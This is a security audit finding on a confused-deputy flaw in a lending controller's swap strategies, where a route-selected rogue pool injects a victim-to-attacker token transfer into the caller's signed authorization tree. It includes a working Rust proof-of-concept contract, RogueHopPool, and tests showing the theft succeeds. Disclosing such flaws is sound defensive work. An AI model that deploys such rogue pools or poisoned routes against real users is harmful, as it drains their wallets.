### Title
Route-selected venue can poison caller authorization and steal unrelated wallet tokens - (File: contracts/controller/src/strategies/swap.rs)

### Summary

`swap_collateral` accepts a caller-selected opaque `swap` payload, withdraws the account’s collateral into controller custody, and invokes the configured router while the caller’s authorization is active. [1](#0-0) [2](#0-1)  The controller narrowly authorizes its own input transfer to the router, but neither its route argument handling nor its post-call balance checks bound other authorization children introduced by code reached through the route. [3](#0-2)  A malicious venue can therefore add a `token.transfer(victim, attacker, amount)` child for an unrelated token; if transaction simulation returns that tree and the victim signs it, the venue steals wallet assets unrelated to the strategy. [4](#0-3) [5](#0-4) 

### Finding Description

`swap_collateral(caller, account_id, current, amount, new, swap)` requires the caller to own or control `account_id`, withdraws `amount` of `current`, and passes the caller-controlled `swap` payload into the router path. [2](#0-1) 

`swap_tokens` authorizes exactly one `token_in.transfer(controller, router, amount_in)` invocation on behalf of the controller and then calls `router.execute_strategy(controller, amount_in, swap)`. [6](#0-5) [7](#0-6) 

After the router returns, the controller only verifies that its own input balance did not increase, that spending did not exceed `amount_in`, that leftover input is refunded, and that the controller received positive `token_out`. [8](#0-7)  Those checks do not prevent a contract reached below the router from requesting an unrelated authorization from the original caller, and the account’s final solvency checks cannot observe a wallet-token debit outside the strategy assets. [9](#0-8) 

The harness demonstrates the confused-deputy shape: a router stand-in invokes the route-selected pool, the pool calls `wallet_token.transfer(victim, attacker, amount)`, simulation records that transfer as a child beneath the victim’s `swap_collateral` authorization, and signing the returned tree makes the theft execute while the strategy still receives fair output. [10](#0-9) [11](#0-10) 

The same route boundary is reachable through `multiply`, `swap_debt`, and `repay_debt_with_collateral`, because those entrypoints also pass caller-controlled `swap` data to `swap_tokens_or_passthrough`. [12](#0-11) [13](#0-12) [14](#0-13) 

### Impact Explanation

A successful attack transfers unrelated tokens directly from the victim’s wallet to the attacker, including tokens that are not listed by the lending protocol and were not supplied as `token_in`. [5](#0-4)  The malicious route can still deliver the expected collateral, so balance-delta output checks and final account-risk checks do not mitigate the unrelated wallet loss. [8](#0-7) [15](#0-14) 

### Likelihood Explanation

The attacker must convince the victim to use a route that reaches the malicious venue and then sign the authorization tree containing the extra transfer. [16](#0-15)  An honest transaction builder that decodes the simulated tree can reject the unexpected child, so exploitation depends on route provenance and wallet/client presentation rather than an authorization bypass. [17](#0-16)  The impact remains severe because the poisoned child can drain a token unrelated to the strategy’s declared input, output, collateral, or debt assets. [5](#0-4) 

### Recommendation

Restrict router-reachable venue or pool addresses to a governance-reviewed registry rather than permitting route-selected arbitrary contracts. [6](#0-5)  Transaction builders should also simulate every route-bearing operation, canonicalize the expected authorization tree, and reject any caller child invocation beyond the expected operation; an honest controller strategy should not require the caller to sign a nested unrelated token transfer. [18](#0-17) 

### Proof of Concept

The harness contains a minimal reproduction in which the router calls the payload-selected `hop_pool`, and the attacker-deployed pool stores `(victim, wallet_token, attacker, amount)` and invokes `wallet_token.transfer(victim, attacker, amount)`. [19](#0-18) 

```rust
// Attacker deploys RogueHopPool with:
// victim = Alice, wallet_token = unrelated SAC,
// to = attacker, amount = WALLET_BALANCE.

controller.swap_collateral(
    alice,
    account_id,
    usdc_key,
    50_000_000_000,
    eth_key,
    route_through_rogue_pool,
);
```

During simulation, the unrelated wallet transfer is recorded as a child beneath Alice’s `swap_collateral` authorization, and the simulation already shows Alice’s unrelated-token balance moved to the attacker while fair `ETH` output is credited. [11](#0-10)  With an honest root-only authorization tree the host rejects the rogue transfer, but signing the simulated tree containing that child authorizes the transfer and leaves Alice’s unrelated-token balance at zero. [20](#0-19)

### Citations

**File:** contracts/controller/src/lib.rs (L283-302)
```rust
    fn swap_collateral(
        env: Env,
        caller: Address,
        account_id: u64,
        current: HubAssetKey,
        amount: i128,
        new: HubAssetKey,
        swap: Bytes,
    ) {
        strategies::swap_collateral::process_swap_collateral(
            &env,
            &caller,
            SwapCollateralParams {
                account_id,
                current: &current,
                from_amount: amount,
                new: &new,
                swap: &swap,
            },
        );
```

**File:** contracts/controller/src/strategies/swap_collateral.rs (L40-65)
```rust
    require_authorized_caller(env, caller);

    assert_with_error!(env, current != new, GenericError::AssetsAreTheSame);
    config::require_hub_active(env, current.hub_id);
    require_positive_amount(env, from_amount);

    let mut account = storage::get_account(env, account_id);
    account::require_owner_or_delegate(env, account_id, caller, &account.owner);
    let mut cache = Context::new(env);
    // Check the destination before withdrawing existing collateral.
    require_can_supply(env, &mut cache, account.spoke_id, new);

    let extra_assets = vec![env, current.asset.clone(), new.asset.clone()];
    prefetch_strategy_prices(&mut cache, &account, &extra_assets);

    let swapped_amount = withdraw_and_swap_from_supply(
        env,
        &mut account,
        &mut cache,
        caller,
        current,
        from_amount,
        &new.asset,
        swap,
        events::PositionAction::SwColWd,
    );
```

**File:** contracts/controller/src/strategies/swap.rs (L33-54)
```rust
    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });

    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L39-70)
```rust
    pub fn execute_strategy(env: Env, sender: Address, total_in: i128, swap_xdr: Bytes) -> i128 {
        sender.require_auth();
        let route = RoutedSwap::from_xdr(&env, &swap_xdr).expect("route must decode");
        let router = env.current_contract_address();
        token::Client::new(&env, &route.token_in).transfer(&sender, &router, &total_in);
        let _: Val = env.invoke_contract(&route.hop_pool, &symbol_short!("swap"), vec![&env]);
        token::Client::new(&env, &route.token_out).transfer(&router, &sender, &route.min_out);
        route.min_out
    }
}

/// Attacker-deployed "pool". `amount == 0` is the benign control.
#[contract]
pub struct RogueHopPool;

#[contractimpl]
impl RogueHopPool {
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L195-226)
```rust
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L229-268)
```rust
#[test]
fn enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer() {
    let s = Scene::new();

    // Control: a pool that touches nothing passes with the honest root-only tree.
    let benign = s.route_through_pool_stealing(0);
    s.try_swap_with_signed_tree(&benign, &[])
        .expect("the honest tree authorizes an honest route");
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);

    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```

**File:** common/src/token.rs (L33-52)
```rust
/// Authorizes, on behalf of the current contract, one `transfer(from, to, amount)`
/// call on `token_addr` made deeper in the next contract call (for example by
/// the pool). The entry allows no further sub-invocations.
pub fn authorize_transfer_as_current(
    env: &Env,
    token_addr: &Address,
    from: &Address,
    to: &Address,
    amount: i128,
) {
    let entry = InvokerContractAuthEntry::Contract(SubContractInvocation {
        context: ContractContext {
            contract: token_addr.clone(),
            fn_name: symbol_short!("transfer"),
            args: (from.clone(), to.clone(), amount).into_val(env),
        },
        sub_invocations: Vec::new(env),
    });
    env.authorize_as_current_contract(vec![env, entry]);
}
```

**File:** contracts/controller/src/strategies/multiply.rs (L86-97)
```rust
    let swap_amount_in = amount_received
        .checked_add(debt_extra)
        .unwrap_or_else(|| panic_with_error!(env, GenericError::MathOverflow));

    let swapped_collateral = swap_tokens_or_passthrough(
        env,
        caller,
        &debt.asset,
        swap_amount_in,
        &collateral.asset,
        swap,
    );
```

**File:** contracts/controller/src/strategies/swap_debt.rs (L65-72)
```rust
    let repay_amount = swap_tokens_or_passthrough(
        env,
        caller,
        &new_debt.asset,
        amount_received,
        &existing_debt.asset,
        swap,
    );
```

**File:** contracts/controller/src/strategies/repay_debt_with_collateral.rs (L108-118)
```rust
    let debt_available = withdraw_and_swap_from_supply(
        env,
        account,
        cache,
        caller,
        collateral,
        collateral_amount,
        &debt.asset,
        swap,
        events::PositionAction::RpColWd,
    );
```
